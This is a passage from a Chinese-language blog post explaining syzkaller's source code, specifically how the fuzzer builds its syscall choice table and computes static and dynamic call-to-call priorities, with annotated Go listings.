<span class="hljs-number">1</span><br>r.NewInputs = <span class="hljs-built_in">append</span>(r.NewInputs, f.inputs[last])<br>f.inputs[last] = rpctype.Input&#123;&#125;<br>f.inputs = f.inputs[:last]<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(f.inputs) == <span class="hljs-number">0</span> &#123;<br>f.inputs = <span class="hljs-literal">nil</span><br>&#125;<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;poll from %v: candidates=%v inputs=%v maxsignal=%v&quot;</span>,<br>a.Name, <span class="hljs-built_in">len</span>(r.Candidates), <span class="hljs-built_in">len</span>(r.NewInputs), <span class="hljs-built_in">len</span>(r.MaxSignal.Elems))<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="构建【系统调用生成优先级表】"><a href="#构建【系统调用生成优先级表】" class="headerlink" title="构建【系统调用生成优先级表】"></a>构建【系统调用生成优先级表】</h2><p>接下来是正式进行 fuzzing 之前最核心的一步——构建<strong>【系统调用生成优先级表】</strong> <code>choiceTable</code> ，该表的作用是：</p><ul><li><strong>计算对于给定的系统调用 x，在添加入系统调用 y 后，代码覆盖率会上升的可能性</strong></li></ul><p>从而<strong>在后续的 fuzzing 过程当中使用该表对输入进行变异</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go">calls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*prog.Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, id := <span class="hljs-keyword">range</span> r.CheckResult.EnabledCalls[sandbox] &#123;<br>calls[target.Syscalls[id]] = <span class="hljs-literal">true</span><br>&#125;<br>fuzzer.choiceTable = target.BuildChoiceTable(fuzzer.corpus, calls)<br></code></pre></td></tr></table></figure><p><code>choiceTable</code> 的计算通过 定义于<code>prog/prio.go</code> 中的 <code>BuildChoiceTable()</code> 完成：</p><ul><li>首先建立两个表：<ul><li>① <code>Syscall→bool</code> 的表 <code>enable</code>，表示<strong>启用的系统调用</strong>，并将所有系统调用都初始化为 <code>true</code> </li><li>② <code>int→bool</code> 的表 <code>noGenerateCalls</code> ，表示<strong>不用于生成的系统调用</strong></li></ul></li><li>接下来遍历系统调用属性（在 syzlang 规则文件中编写），若某个系统调用不开启则将其从 <code>enable</code> 表中去除，若某个系统调用不用于生成则将其从 <code>enable</code> 表中去除并添加到 <code>noGenerateCalls</code> 表</li><li>之后创建第三个表 <code>generateCalls</code>，为 <code>enable</code> 表的拷贝，表示<strong>用于生成的系统调用</strong>，并根据系统调用号进行从小到大的排序</li></ul><blockquote><p>这里的【生成】指的是生成新的输入，即我们是否在输入生成时添加该系统调用</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> BuildChoiceTable(corpus []*Prog, enabled <span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>) *ChoiceTable &#123;<br><span class="hljs-keyword">if</span> enabled == <span class="hljs-literal">nil</span> &#123;<br>enabled = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[*Syscall]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> _, c := <span class="hljs-keyword">range</span> target.Syscalls &#123;<br>enabled[c] = <span class="hljs-literal">true</span><br>&#125;<br>&#125;<br>noGenerateCalls := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">for</span> call := <span class="hljs-keyword">range</span> enabled &#123;<br><span class="hljs-keyword">if</span> call.Attrs.Disabled &#123;<br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> call.Attrs.NoGenerate &#123;<br>noGenerateCalls[call.ID] = <span class="hljs-literal">true</span><br><span class="hljs-built_in">delete</span>(enabled, call)<br>&#125;<br>&#125;<br>    <span class="hljs-keyword">var</span> generatableCalls []*Syscall<br><span class="hljs-keyword">for</span> c := <span class="hljs-keyword">range</span> enabled &#123;<br>generatableCalls = <span class="hljs-built_in">append</span>(generatableCalls, c)<br>&#125;<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(generatableCalls) == <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;no syscalls enabled and generatable&quot;</span>)<br>&#125;<br>sort.Slice(generatableCalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(i, j <span class="hljs-type">int</span>)</span></span> <span class="hljs-type">bool</span> &#123;<br><span class="hljs-keyword">return</span> generatableCalls[i].ID &lt; generatableCalls[j].ID<br>&#125;)<br></code></pre></td></tr></table></figure><ul><li>接下来判断语料库中是否包含有禁用的系统调用，若是则直接退出</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> _, p := <span class="hljs-keyword">range</span> corpus &#123;<br><span class="hljs-keyword">for</span> _, call := <span class="hljs-keyword">range</span> p.Calls &#123;<br><span class="hljs-keyword">if</span> !enabled[call.Meta] &amp;&amp; !noGenerateCalls[call.Meta.ID] &#123;<br>fmt.Printf(<span class="hljs-string">&quot;corpus contains disabled syscall %v\n&quot;</span>, call.Meta.Name)<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;disabled syscall&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>最后调用 <code>target.CalculatePriorities(corpus)</code> <strong>基于语料库进行系统调用生成优先级表的计算</strong></li><li>完成后生成一个新的表 <code>run</code> 作为结果与生成&amp;不生成系统调用表一起返回，其中存储的是对于启用的系统调用而言的<strong>加权权重的累加和</strong></li></ul><blockquote><p>例如有给定的三个系统调用 A、B、C，有这样的一个生成优先级表 <code>prios</code>：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>那么在 <code>run</code> 表中则会将一列的结果逐个加起来，从而有这样的一个结果：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache">  <span class="hljs-attribute">A</span> B C<br><span class="hljs-attribute">A</span> <span class="hljs-number">1</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span><br><span class="hljs-attribute">B</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">5</span><br><span class="hljs-attribute">C</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span><br></code></pre></td></tr></table></figure><p>为什么要这么做笔者也不知道：(</p></blockquote><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go">prios := target.CalculatePriorities(corpus)<br>run := <span class="hljs-built_in">make</span>([][]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-comment">// ChoiceTable.runs[][] 包含对加权优先级数字的累加总和.</span><br><span class="hljs-comment">// 这在生成程序时有助于带权快速二叉搜索.</span><br><span class="hljs-comment">// 这仅用于在目标上所启用的系统调用.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> run &#123;<br><span class="hljs-keyword">if</span> !enabled[target.Syscalls[i]] &#123;<br><span class="hljs-keyword">continue</span><br>&#125;<br>run[i] = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int32</span>, <span class="hljs-built_in">len</span>(target.Syscalls))<br><span class="hljs-keyword">var</span> sum <span class="hljs-type">int32</span><br><span class="hljs-keyword">for</span> j := <span class="hljs-keyword">range</span> run[i] &#123;<br><span class="hljs-keyword">if</span> enabled[target.Syscalls[j]] &#123;<br>sum += prios[i][j]<br>&#125;<br>run[i][j] = sum<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> &amp;ChoiceTable&#123;target, run, generatableCalls, noGenerateCalls&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="【核心】target-CalculatePriorities-corpus-：计算-call-to-call-的权重表"><a href="#【核心】target-CalculatePriorities-corpus-：计算-call-to-call-的权重表" class="headerlink" title="【核心】target.CalculatePriorities(corpus)：计算 call-to-call 的权重表"></a>【核心】target.CalculatePriorities(corpus)：计算 call-to-call 的权重表</h3><p>定义于 <code>prog/prio.go</code> 中的 <code>CalculatePriorities(corpus)</code> 为系统调用生成优先级表的核心计算过程，代码其实比较简单（不过注释很长），主要分为<strong>静态优先级</strong>与<strong>动态优先级</strong>两部分进行计算，默认进行静态优先级的计算，若语料库不为空则再计算动态优先级：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 计算 call-to-call 的优先级.</span><br><span class="hljs-comment">// 对于一对给定的调用 X 与 Y, 优先级便是我们对于</span><br><span class="hljs-comment">// 将一个额外的调用 Y 添加到一个包含有调用 X 的程序当中</span><br><span class="hljs-comment">// 是否有可能给出新的覆盖率的猜测.</span><br><span class="hljs-comment">// 当前的算法有两个部分：静态与动态.</span><br><span class="hljs-comment">// 静态部分基于对参数类型的分析. 举个🌰,</span><br><span class="hljs-comment">// 若调用 X 与 Y 都接受 fd[sock], 则他们更有可能一起给出新的覆盖率.</span><br><span class="hljs-comment">// 动态部分则基于语料库中一对特定的系统调用在一个程序中出现的频率.</span><br><span class="hljs-comment">// 例如，若 socket 与 connect 频繁地在一个程序中一起出现，</span><br><span class="hljs-comment">// 我们给这对系统调用更高的优先级.</span><br><span class="hljs-comment">// 注意: 当前的实现非常简陋, 任何常量背后都没有理论支持.</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> CalculatePriorities(corpus []*Prog) [][]<span class="hljs-type">int32</span> &#123;<br>static := target.calcStaticPriorities()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(corpus) != <span class="hljs-number">0</span> &#123;<br>dynamic := target.calcDynamicPrio(corpus)<br><span class="hljs-keyword">for</span> i, prios := <span class="hljs-keyword">range</span> dynamic &#123;<br>dst := static[i]<br><span class="hljs-keyword">for</span> j, p := <span class="hljs-keyword">range</span> prios &#123;<br>dst[j] = dst[j] * p / prioHigh<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> static<br>&#125;<br></code></pre></td></tr></table></figure><p>对于给定的系统调用 X，添加系统调用 Y 的优先级为：<br>$$<br>最终优先级 &#x3D; 静态优先级 * 动态优先级 &#x2F; prioHigh<br>$$<br> 其中 <code>prioHigh</code> 为一个常量 <code>1000</code></p><h4 id="①-calcStaticPriorities-：静态优先级计算"><a href="#①-calcStaticPriorities-：静态优先级计算" class="headerlink" title="① calcStaticPriorities()：静态优先级计算"></a>① calcStaticPriorities()：静态优先级计算</h4><h5 id="Step-I-计算资源使用情况"><a href="#Step-I-计算资源使用情况" class="headerlink" title="Step.I - 计算资源使用情况"></a>Step.I - 计算资源使用情况</h5><blockquote><p>注：这里的【资源】更严谨地说应该是 syzlang 中的 <a href="https://arttnba3.cn/2021/11/24/FUZZ-0X01-SYZKALLER-I/#VI-%E8%B5%84%E6%BA%90%EF%BC%88resources%EF%BC%89">resource</a></p></blockquote><p><code>calcStaticPriorities()</code> 用以完成静态优先级的计算，该函数首先会调用 <code>calcResourceUsage()</code> 获取当前的【资源使用情况】：</p><ul><li>该函数的返回结果为一个二重映射 <code>资源名（string）→【系统调用号（int）→权重（weights）】</code> </li><li>该函数的核心逻辑便是调用 <code>ForeachType()</code> 进行分析</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcStaticPriorities() [][]<span class="hljs-type">int32</span> &#123;<br>uses := target.calcResourceUsage()<br><span class="hljs-comment">//...</span><br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(target *Target)</span></span> calcResourceUsage() <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights &#123;<br>uses := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>ForeachType(target.Syscalls, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">return</span> uses<br>&#125;<br></code></pre></td></tr></table></figure><p>我们稍后再来分析传入的闭包函数，我们首先分析 <code>ForeachType()</code> ，其会遍历系统调用表并调用 <code>foreachTypeImpl()</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">ForeachTypePost</span><span class="hljs-params">(syscalls []*Syscall, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-keyword">for</span> _, meta := <span class="hljs-keyword">range</span> syscalls &#123;<br>foreachTypeImpl(meta, <span class="hljs-literal">false</span>, f)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p> <code>foreachTypeImpl()</code>  用以处理单个系统调用，其首先会创建一个 <code>类型→bool</code> 的映射 <code>seen</code>，接下来会创建一个闭包函数 <code>rec</code> ，该函数会根据传入类型的不同进行不同操作：</p><blockquote><p>注：这里的类型应当为 syzlang 中的类型</p></blockquote><ul><li>若是指针类型 （<code>PtrType</code> ），则递归调用  <code>rec</code> </li><li>若是数组类型（<code>ArrayType</code> ），则递归调用 <code>rec</code></li><li>若是结构体类型（<code>StructType</code>）且不在 <code>seen</code> 中，将其添加到 <code>seen</code> 中，并为每一个结构体成员调用 <code>rec</code> </li><li>若是联合类型（<code>UnionType</code>）且不在 <code>seen</code> 中，将其添加到 <code>seen</code> 中，并为每一个联合成员调用 <code>rec</code> </li><li>其他合法类型则直接跳过，非法类型（syzlang 编译期错误）则 panic</li><li>最后调用上层传入的闭包函数（我们在 <code>ForeachTypePost()</code> 中传入 <code>preorder = false</code>）</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">foreachTypeImpl</span><span class="hljs-params">(meta *Syscall, preorder <span class="hljs-type">bool</span>, f <span class="hljs-keyword">func</span>(t Type, ctx *TypeCtx)</span></span>) &#123;<br><span class="hljs-comment">// 注意: 我们特意不在 ForeachType 中创建 seen..</span><br><span class="hljs-comment">// 其能更好地对递归进行剪枝 (在系统调用间), 但大量的使用者需要</span><br><span class="hljs-comment">// 对单个系统调用访问每个结构体 (例如 prio, used resources).</span><br>seen := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[Type]<span class="hljs-type">bool</span>)<br><span class="hljs-keyword">var</span> rec <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(*Type, Dir)</span></span><br>rec = <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(ptr *Type, dir Dir)</span></span> &#123;<br>ctx := &amp;TypeCtx&#123;Meta: meta, Dir: dir, Ptr: ptr&#125;<br><span class="hljs-keyword">if</span> preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">switch</span> a := (*ptr).(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *PtrType:<br>rec(&amp;a.Elem, a.ElemDir)<br><span class="hljs-keyword">case</span> *ArrayType:<br>rec(&amp;a.Elem, dir)<br><span class="hljs-keyword">case</span> *StructType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// 通过对structs/unions的指针来剪枝掉递归</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *UnionType:<br><span class="hljs-keyword">if</span> seen[a] &#123;<br><span class="hljs-keyword">break</span> <span class="hljs-comment">// 通过对structs/unions的指针来剪枝掉递归</span><br>&#125;<br>seen[a] = <span class="hljs-literal">true</span><br><span class="hljs-keyword">for</span> i, f := <span class="hljs-keyword">range</span> a.Fields &#123;<br>rec(&amp;a.Fields[i].Type, f.Dir(dir))<br>&#125;<br><span class="hljs-keyword">case</span> *ResourceType, *BufferType, *VmaType, *LenType, *FlagsType,<br>*ConstType, *IntType, *ProcType, *CsumType:<br><span class="hljs-keyword">case</span> Ref:<br><span class="hljs-comment">// 仅 pkg/compiler 需要.</span><br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown type&quot;</span>)<br>&#125;<br><span class="hljs-keyword">if</span> !preorder &#123;<br>f(*ptr, ctx)<br><span class="hljs-keyword">if</span> ctx.Stop &#123;<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;Stop is set in post-order iteration&quot;</span>)<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>而 <code>foreachTypeImpl()</code> 实际上便是为传入的系统调用的每个参数都调用 <code>rec()</code>，若存在返回值也为其调用 <code>rec</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> i := <span class="hljs-keyword">range</span> meta.Args &#123;<br>rec(&amp;meta.Args[i].Type, DirIn)<br>&#125;<br><span class="hljs-keyword">if</span> meta.Ret != <span class="hljs-literal">nil</span> &#123;<br>rec(&amp;meta.Ret, DirOut)<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>现在我们回到 <code>calcResourceUsage()</code> 看其传给 <code>ForeachType()</code> 的闭包函数，也是根据系统调用的参数的类型不同进行处理：</p><blockquote><p>这里的 <code>a</code> 为 Type 接口， a.Desc 为 ResourceDesc类型，即对一个资源的描述，其 Kind 域为一个 string 数组，Values 域为一个 uint64 数组</p></blockquote><ul><li><p>若是资源类型 （<code>ResourceType</code> ）：</p><ul><li>若在 <code>AuxResources</code> 表（辅助资源表，即扮演着辅助角色但是在所有系统调用中都会用到的资源（例如uid&#x2F;gid））里已有记录，则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 1</li><li>否则，遍历 <code>a.Desc.Kind</code> ，调用 <code>noteUsage()</code> 更新权重值，这里给除了最后一个 Kind 以外的权重值为 2，最后一个为 10</li></ul></li><li><p>若是指针类型（<code>PttrType</code>），则判断指针所指对象类型（结构体&#x2F;联合体&#x2F;数组）并调用 <code>noteUsage()</code> 更新权重值，这里给的权重值都为 10</p></li><li><p>若是 buffer 类型（<code>BufferType</code>），则根据 <code>a.Kind</code> 进行不同处理：</p><ul><li><code>BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed</code> ：无处理</li><li><code>BufferString, BufferGlob</code> ：若 <code>a.SubKind != &quot;&quot;</code>，则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 2</li><li><code>BufferFilename</code>：调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 10</li></ul></li><li><p>若为 VMA 类型 （<code>VmaType</code>），则调用 <code>noteUsage()</code> 更新权重值，这里给的权重值为 5</p></li><li><p>对于整型则检查 <code>a.Kind</code> 是否为 <code>IntPlain, IntRange</code>，若不是则直接 panic</p></li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(t Type, ctx *TypeCtx)</span></span> &#123;<br>c := ctx.Meta<br><span class="hljs-keyword">switch</span> a := t.(<span class="hljs-keyword">type</span>) &#123;<br><span class="hljs-keyword">case</span> *ResourceType:<br><span class="hljs-keyword">if</span> target.AuxResources[a.Desc.Name] &#123;<br>noteUsage(uses, c, <span class="hljs-number">1</span>, ctx.Dir, <span class="hljs-string">&quot;res%v&quot;</span>, a.Desc.Name)<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>str := <span class="hljs-string">&quot;res&quot;</span><br><span class="hljs-keyword">for</span> i, k := <span class="hljs-keyword">range</span> a.Desc.Kind &#123;<br>str += <span class="hljs-string">&quot;-&quot;</span> + k<br>w := <span class="hljs-type">int32</span>(<span class="hljs-number">10</span>)<br><span class="hljs-keyword">if</span> i &lt; <span class="hljs-built_in">len</span>(a.Desc.Kind)<span class="hljs-number">-1</span> &#123;<br>w = <span class="hljs-number">2</span><br>&#125;<br>noteUsage(uses, c, w, ctx.Dir, str)<br>&#125;<br>&#125;<br><span class="hljs-keyword">case</span> *PtrType:<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*StructType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> _, ok := a.Elem.(*UnionType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, a.Elem.Name())<br>&#125;<br><span class="hljs-keyword">if</span> arr, ok := a.Elem.(*ArrayType); ok &#123;<br>noteUsage(uses, c, <span class="hljs-number">10</span>, ctx.Dir, <span class="hljs-string">&quot;ptrto-%v&quot;</span>, arr.Elem.Name())<br>&#125;<br><span class="hljs-keyword">case</span> *BufferType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> BufferBlobRand, BufferBlobRange, BufferText, BufferCompressed:<br><span class="hljs-keyword">case</span> BufferString, BufferGlob:<br><span class="hljs-keyword">if</span> a.SubKind != <span class="hljs-string">&quot;&quot;</span> &#123;<br>noteUsage(uses, c, <span class="hljs-number">2</span>, ctx.Dir, fmt.Sprintf(<span class="hljs-string">&quot;str-%v&quot;</span>, a.SubKind))<br>&#125;<br><span class="hljs-keyword">case</span> BufferFilename:<br>noteUsage(uses, c, <span class="hljs-number">10</span>, DirIn, <span class="hljs-string">&quot;filename&quot;</span>)<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown buffer kind&quot;</span>)<br>&#125;<br><span class="hljs-keyword">case</span> *VmaType:<br>noteUsage(uses, c, <span class="hljs-number">5</span>, ctx.Dir, <span class="hljs-string">&quot;vma&quot;</span>)<br><span class="hljs-keyword">case</span> *IntType:<br><span class="hljs-keyword">switch</span> a.Kind &#123;<br><span class="hljs-keyword">case</span> IntPlain, IntRange:<br><span class="hljs-keyword">default</span>:<br><span class="hljs-built_in">panic</span>(<span class="hljs-string">&quot;unknown int kind&quot;</span>)<br>&#125;<br>&#125;<br>&#125;)<br></code></pre></td></tr></table></figure><p>这里大量用到了 <code>noteUsage()</code> 函数，该函数其实就是用来<strong>更新传入的表中 X 到 Y 的权重值</strong>（取最大值）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">noteUsage</span><span class="hljs-params">(uses <span class="hljs-keyword">map</span>[<span class="hljs-type">string</span>]<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights, c *Syscall, weight <span class="hljs-type">int32</span>, dir Dir, str <span class="hljs-type">string</span>, args ...<span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>id := fmt.Sprintf(str, args...)<br><span class="hljs-keyword">if</span> uses[id] == <span class="hljs-literal">nil</span> &#123;<br>uses[id] = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">map</span>[<span class="hljs-type">int</span>]weights)<br>&#125;<br>callWeight := uses[id][c.ID]<br>callWeight.call = c.ID<br><span class="hljs-keyword">if</span> dir != DirOut &#123;<br><span class="hljs-keyword">if</span> weight &gt; uses[id][c.ID].in &#123;<br>callWeight.in = 